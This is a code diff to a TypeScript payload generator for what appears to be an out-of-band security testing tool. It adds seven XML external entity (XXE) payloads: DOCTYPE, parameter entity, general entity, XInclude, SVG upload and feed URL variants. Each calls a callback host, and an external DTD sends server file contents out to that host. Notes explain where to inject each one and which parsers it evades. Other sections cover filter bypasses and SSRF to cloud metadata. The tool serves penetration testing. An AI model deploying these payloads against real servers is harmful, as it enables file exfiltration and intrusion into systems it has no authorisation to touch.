@@ -6,7 +6,7 @@
 // letter + a number: they never collide with tags users plant (the tag is always the label next to
 // the id) and never decode as exfil (too short).
 
-export type Section = "callbacks" | "bypass" | "address" | "ssrf";
+export type Section = "callbacks" | "bypass" | "address" | "ssrf" | "xxe";
 export type Variant = { code: string; section: Section; name: string };
 export type Payload = Variant & { text: string; note?: string };
 
@@ -118,10 +118,28 @@ export function ssrfPayloads(tag: string, host: string): Payload[] {
   ];
 }
 
+// XXE: every row that loads the DTD (x.dtd) also brings the file back as a kx0 hit. HTTP, because the
+// DTD's exfil URL is HTTP and some parsers won't mix schemes.
+export function xxePayloads(tag: string, host: string): Payload[] {
+  const v = (code: string, name: string, text: string, note: string): Payload => ({ code, section: "xxe", name, text, note });
+  const dtd = (code: string) => `http://${sub(code, tag, host)}/x.dtd`;
+  return [
+    v("kx1", "DOCTYPE line", `<!DOCTYPE x SYSTEM "${dtd("kx1")}">`, "Put it after the <?xml ?> line of a document you control."),
+    v("kx2", "Whole document", `<?xml version="1.0"?><!DOCTYPE x SYSTEM "${dtd("kx2")}"><x>1</x>`, "For a body or an upload that takes any XML."),
+    v("kx3", "Parameter entity", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "${dtd("kx3")}"> %p;]><x>1</x>`, "Loads the DTD as a parameter entity; for parsers that refuse an external DOCTYPE but allow entities."),
+    v("kx4", "External entity", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://${sub("kx4", tag, host)}/">]><x>&e;</x>`, "A plain callback through a general entity: proves resolution, reads nothing. Xerces controls this separately from external DTDs."),
+    v("kx5", "XInclude", `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://${sub("kx5", tag, host)}/"/></x>`, "When you only control one value inside a document the server builds."),
+    v("kx6", "SVG upload", `<?xml version="1.0" standalone="no"?><!DOCTYPE svg SYSTEM "${dtd("kx6")}"><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>`, "Image uploads that parse SVG server-side (thumbnails, converters)."),
+    v("kx7", "Feed URL", `http://${sub("kx7", tag, host)}/feed.xml`, "For \"import from URL\" features: an RSS feed that pulls the DTD. /sitemap.xml works the same."),
+  ];
+}
+// the hit that carries the file: the DTD sends it to kx0 (registered so the hit is named)
+const XXE_DATA: Payload = { code: "kx0", section: "xxe", name: "File data from the DTD", text: "" };
+
 // ---------- which payload a hit came from ----------
-const ALL: Variant[] = [...callbacks("t", "h"), ...bypasses("t", "h", "e"), ...ssrfPayloads("t", "h")].map(({ code, section, name }) => ({ code, section, name }));
+const ALL: Variant[] = [...callbacks("t", "h"), ...bypasses("t", "h", "e"), ...ssrfPayloads("t", "h"), ...xxePayloads("t", "h"), XXE_DATA].map(({ code, section, name }) => ({ code, section, name }));
 const BY_CODE = new Map(ALL.map((v) => [v.code, v]));
-export const SECTION_LABEL = { ...Object.fromEntries(SECTIONS.map((s) => [s.id, s.label])), ssrf: "SSRF → cloud metadata" } as Record<string, string>;
+export const SECTION_LABEL = { ...Object.fromEntries(SECTIONS.map((s) => [s.id, s.label])), ssrf: "SSRF → cloud metadata", xxe: "XXE" } as Record<string, string>;
 
 // extraLabels: the labels in front of the tag (the code is the one right next to it). summary: the
 // request line or SMTP summary. raw: the raw request, for an SMTP recipient.
